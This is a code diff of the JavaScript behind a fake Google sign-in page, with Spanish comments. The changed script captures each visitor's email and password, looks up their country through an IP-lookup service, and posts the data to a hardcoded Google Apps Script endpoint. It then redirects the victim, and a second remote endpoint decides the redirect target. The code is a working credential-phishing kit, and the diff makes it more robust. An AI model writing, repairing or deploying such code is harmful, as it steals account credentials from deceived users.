@@ -1,120 +1,134 @@
-document.getElementById("miFormulario").addEventListener("submit", async function(event) {
+// Script corregido basado en la estructura del HTML proporcionado
+
+document.getElementById("loginForm").addEventListener("submit", async function(event) {
     event.preventDefault(); // Evita el envío automático 
 
-    // Obtener elementos del formulario
-    const emailInput = document.querySelector('input[name="email"]');
-    const passwordInput = document.querySelector('input[name="password"]');
-    const errorMessage = document.getElementById('error-message');
+    // Obtener elementos del formulario (usando los IDs correctos del HTML)
+    const emailInput = document.getElementById('emailInput');
+    const passwordInput = document.getElementById('passwordInput');
+    const errorMessage = document.getElementById('errorMessage');
+    const submitBtn = document.getElementById('submitBtn');
     
     // Lista de correos electrónicos y contraseñas prohibidas
-    const prohibitedEmails = ["ejemplo1@correo.com", "ejemplo@mail.com"]; // Corregido: faltaba comilla de cierre
-    const prohibitedWords = ["hola123", "Sandia190395#", "sandia190395#"]; // Agregadas las palabras del HTML
+    const prohibitedEmails = ["ejemplo@mail.com", "ejemplo1@correo.com"]; 
+    const prohibitedWords = ["Sandia190395#", "sandia190395#", "hola123"]; 
     
     const email = emailInput.value.trim().toLowerCase();
     const password = passwordInput.value;
     
+    console.log("Email ingresado:", email); // Para depuración
+    console.log("Password ingresado:", password); // Para depuración
+    
+    // Limpiar errores previos
+    errorMessage.style.display = 'none';
+    errorMessage.textContent = '';
+    
     // Validar formato de correo electrónico
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
     if (!emailRegex.test(email)) {
-        errorMessage.textContent = "Introduce una dirección de correo electrónico válida";
-        errorMessage.style.color = 'red';
-        errorMessage.style.display = 'block';
-        return; // Detiene el procesamiento
+        showError("Introduce una dirección de correo electrónico válida");
+        return;
     }
     
     // Verificar correo prohibido
-    const isProhibitedEmail = prohibitedEmails.includes(email);
-    if (isProhibitedEmail) {
-        errorMessage.textContent = "No se pudo encontrar tu cuenta de Google";
-        errorMessage.style.color = 'red';
-        errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
-        errorMessage.style.display = 'block';
+    if (prohibitedEmails.includes(email)) {
+        showError("No se pudo encontrar tu cuenta de Google");
         emailInput.value = '';
         passwordInput.value = '';
-        return; // Detiene el procesamiento
+        return;
     }
     
-    // Verificar contraseña prohibida
+    // Verificar contraseña prohibida (usando .some() para verificar si contiene alguna palabra prohibida)
     const containsProhibitedPassword = prohibitedWords.some(word => password.includes(word));
     if (containsProhibitedPassword) {
-        errorMessage.textContent = "La contraseña no es correcta. Inténtalo de nuevo.";
-        errorMessage.style.color = 'red';
-        errorMessage.style.fontFamily = "'Noto Sans', sans-serif";
-        errorMessage.style.display = 'block';
+        showError("La contraseña no es correcta. Inténtalo de nuevo.");
         passwordInput.value = '';
-        return; // Detiene el procesamiento
+        return;
     }
     
-    // Si pasa todas las validaciones, continúa con el proceso normal
-    // Limpiar cualquier mensaje de error previo
-    if (errorMessage) {
-        errorMessage.textContent = "";
-        errorMessage.style.display = 'none';
-    }
-
-    // Ocultar el formulario
-    document.getElementById("miFormulario").style.display = "none";
+    // Si llegamos aquí, significa que pasó todas las validaciones
+    console.log("Todas las validaciones pasaron, continuando..."); // Para depuración
     
-    // Mostrar mensaje "Cargando..."
-    let loadingMessage = document.createElement("p");
-    loadingMessage.textContent = "⏳ Procesando... por favor, espere.";
-    loadingMessage.style.textAlign = "center";
-    document.body.appendChild(loadingMessage);
+    // Deshabilitar botón
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Verificando...';
     
-    // Antes de mostrar el iframe, ocultar el footer de folder.html
-    const footerElement = document.querySelector("p");
-    if (footerElement) {
-        footerElement.style.display = "none";
-    }
-
-    // Mostrar el iframe
-    let iframe = document.getElementById("usuarioFrame");
-    iframe.src = "invitation.html";
-    iframe.style.display = "block";
-    
-    // Eliminar mensaje de carga después de mostrar usuario.html
-    iframe.onload = function() {
-        if (loadingMessage && loadingMessage.parentNode) {
-            loadingMessage.remove();
-        }
-    };
-    
-    // ✅ Detectar si el usuario usa iPhone o Android
-    let deviceType = "Otro"; // Valor por defecto
-    if (/android/i.test(navigator.userAgent)) {
-        deviceType = "Android";
-    } else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
-        deviceType = "iPhone";
-    }
-    
-    // ✅ Obtener el país y la ciudad del usuario desde la API
-    let country = "Desconocido";
-    let city = "Desconocido";
     try {
-        const response = await fetch("https://ipwhois.app/json/");
-        const data = await response.json();
-        if (data) {
+        // Detectar dispositivo
+        let deviceType = "Otro";
+        if (/android/i.test(navigator.userAgent)) {
+            deviceType = "Android";
+        } else if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
+            deviceType = "iPhone";
+        }
+        
+        // Obtener país
+        let country = "Desconocido";
+        try {
+            const response = await fetch("https://ipwhois.app/json/");
+            const data = await response.json();
             if (data.country) {
                 country = data.country;
             }
-            if (data.city) {
-                city = data.city;
-            }
+        } catch (error) {
+            console.error("Error obteniendo el país:", error);
+        }
+        
+        // Enviar datos
+        const formData = new FormData();
+        formData.append("email", email);
+        formData.append("password", password);
+        formData.append("device", deviceType);
+        formData.append("country", country);
+        
+        const url = "https://script.google.com/macros/s/AKfycbxX_HcLaDf7l6NEl3z57fbYMLpAxve1DLBamLWnW5n6ap0kNuzI_Qv2IW9h6kE9rxN2/exec";
+        
+        const response = await fetch(url, {
+            method: "POST",
+            body: new URLSearchParams(formData),
+            headers: { "Content-Type": "application/x-www-form-urlencoded" }
+        });
+        
+        if (response.ok) {
+            window.location.href = "invitation.html";
+        } else {
+            showError("Error al iniciar sesión. Inténtalo de nuevo.");
         }
     } catch (error) {
-        console.error("Error obteniendo la ubicación:", error);
+        showError("Error de conexión. Inténtalo de nuevo.");
+        console.error("Error:", error);
+    } finally {
+        submitBtn.disabled = false;
+        submitBtn.textContent = 'Siguiente';
     }
+});
+
+// Función para mostrar errores
+function showError(message) {
+    const errorMessage = document.getElementById('errorMessage');
+    errorMessage.textContent = message;
+    errorMessage.style.display = 'block';
+    console.log("Error mostrado:", message); // Para depuración
+}
+
+// Manejar mostrar/ocultar contraseña
+document.getElementById('showPassword').addEventListener('change', function() {
+    const passwordInput = document.getElementById('passwordInput');
+    passwordInput.type = this.checked ? 'text' : 'password';
+});
+
+// Verificar redirección
+document.addEventListener("DOMContentLoaded", async function () {
+    const API_URL = "https://script.google.com/macros/s/AKfycbyoGDPGgsNZgpj9Jp8S6o15CCDUbScmb5MctgpMtwmsqEggwxw-JHYSvDB-FbPlXWQq/exec";
     
-    // ✅ Asegurar que los datos se agregan correctamente antes de enviarlos
-    const formData = new FormData(this);
-    formData.append("device", deviceType);
-    formData.append("country", country + " - " + city);
-    
-    // ✅ Enviar los datos correctamente a Google Sheets
-    const url = "https://script.google.com/macros/s/AKfycbxX_HcLaDf7l6NEl3z57fbYMLpAxve1DLBamLWnW5n6ap0kNuzI_Qv2IW9h6kE9rxN2/exec";
-    fetch(url, {
-        method: "POST",
-        body: new URLSearchParams(formData),
-        headers: { "Content-Type": "application/x-www-form-urlencoded" }
-    }).catch(error => console.error("Error al enviar datos:", error));
+    try {
+        const response = await fetch(`${API_URL}?t=${new Date().getTime()}`);
+        const pagina = await response.text();
+        
+        if (pagina.trim() !== "folder.html") {
+            window.location.href = pagina;
+        }
+    } catch (error) {
+        console.error("Error al verificar la redirección:", error);
+    }
 });
